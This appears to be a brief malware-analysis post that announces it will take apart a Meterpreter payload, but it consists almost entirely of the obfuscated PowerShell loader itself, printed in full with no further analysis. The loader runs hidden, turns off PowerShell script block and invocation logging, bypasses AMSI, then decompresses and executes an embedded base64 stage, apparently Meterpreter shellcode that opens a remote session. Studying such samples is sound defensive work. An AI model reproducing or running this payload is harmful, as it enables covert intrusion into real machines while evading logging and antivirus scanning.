## Meterpreter Shellcode Obfuscated in PowerShell
Taking apart a Meterpreter Payload encoded within an obfuscated PowerShell script.

```powershell
C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -nop -w hidden -noni -c <!#-- if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c
$x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new();
$gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u''));
$plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a''));
if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null);
If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}
{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object
System.IO.MemoryStream(,
[System.Convert]::FromBase64String(((''''H4sIA{1}wxYWUA/7VWbW/aShP9X''+''qn/waqQsHUJmJf2kkiVnjX{1}QIOJiQMkUFRt7MVsWXuJvQ5Bvf3vnfV{0}QtSkzXOvasnCXs/M''+''zp45c4ZV{1}rqC8lCh723l29s3Sn7ZOMKBopbcGW/fV5QS3WqPH0t+m42Uj4q6QNttlweYhsuTk04SRSQU2Xu1RwSKYx{0}cM{1}piVVP+UWZr{1}pGj85uvxBXKN6X0pdpj/Aaz3Gzfwe6aK{1}co9OS3IXexTKzqbBkVavnz57K2OKovq6e3CWaxWnb2sSBB1WOsrCnfNbnh5X5{0}1{0}JF3YjHfCWqMxo2G9VJGOMVGUG0O2IRseZeXIbDPB4nIiKJwuxUMkxmpJbh0Y64izwvInFcrig{0}ucFiufyfush3v0hCQ''+''QNSHYSCRHzrkOiOuiSu9nHoMXJBVkvwckR{1}Q3+paWB2xzd{1}{0}YUJYxXl/wmjjsiuwO61Tuqh{1}1jZItIqUNNnzmlx{0}2{1}k8yw/k2jGAw2ujAuA33cJ4QN9Alz/0n2GQI8{0}xbVIvxDIWbV5TFPvj4peUSzYHQse7eG1dBklRFs+IK6UghY6q7w2Wr1wBce7XgIriymn3v{0}R/wkBSqvb3vS9tHqZz12yoiHp7kMcU{0}eg7BO{1}i7KQFYNXSd3''+''CbAQZquX8A/G6hB{1}fCwm0ZMdPbqcBFQ++RkKZRy{0}kQmljyAqqrj1NJqudWh6{1}FgkAvuwd6FpaQaOQwjpvjn2xu3wHo3KH4TiuKHYCnepWFIdgRryKgsKY5p9QInj6KFsgT9dKmKAujkURbnmoDyme+b4dHsYiSlyo{0}GBw6WyJSzGTkFSUPvWIsXeoX+x/sMMBIB3MGHQQR{0}qDgsCKBMIRki8RpJpyQ6s6RAyC{0}SMB2KTSYT{0}sg1DkfZISDPv{1}k83/bKZFP2Tkl9gUoBzkCQV3GBcVZUojA''+''UokcQaK/assfpag{0}J1ORPICqUWj{0}Yy9kI1QCofjxkZSNYcpBSUSAIgZ8cDAMfnQygRHfVc7pzaC67rbdyiZbmh9sIPbgntCmwNurdq20HlguZ3Y7pltRHf+zm2PkOt98sixA3bjaUt0bNQfU91orV1Dv0yf/Wta933kjcZrl+n26ea+1op1uuvPZKwshttq9a''+''901Gy2zpv6BgCUPhvwCejufgjPoKznQ2MQG/qAnX7qXNzMGuZ8xvq1lrlezXjsf{0}ju1mq1Yw93rT1CBvea1v6qfs{1}v+25gt{1}JeO+60NugUoU54OjUNfnZtRMiuTbG/5bszH6GZ30HorzUl8/H{1}NMZj00CT3tfb7nHNrx3PrvDam{1}0bd{0}69uljDu7nrj62a3hp45J63hzM6vZOxjFvDnF9hNJzvzVqtfh038MbgyABgzfkt6q2vt6bNwP9y0uBoykaPtuN+9''+''8yd1/+OrY/voJK{0}CQ1Fs7GUjdmUovf2TYm5x+2Dcr4k6haO4jVm''+''UGZQ66{0}nTB6ZuQDbH{1}KDCKpyjm9IFBIGow+GY8FTxBh3pfxnSg2zJ5sIckBN4BHSeu5JgyGfG4{0}4F3OhWDo5mUOWwP2UldUhCX2xruj3TV0HQdfv9VbK8tcfrsO3e5g6Mhr4Q2AJz0N8lsaHkHSlq{0}8dnv''+''8ZMhj+AhToF6C9hB/svQHBAAn{0}mliiaHDODjHMj/bAiScQAnZ1OP5Cjv6U{0}RDiiNwqJVBSoh3O2VJyc37zRwmUq9{1}afrzf{1}uhx7RdfX0UqvZIh9NPy04UDMf9z{1}MwwFWDogKoyko37F5DIu+agz{0}I+0BKr''+''/J{0}/hM8TcTSCf1aptv8AyS{1}BNoI{0}AAA='')-f''L'',''E'')))),
[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
```
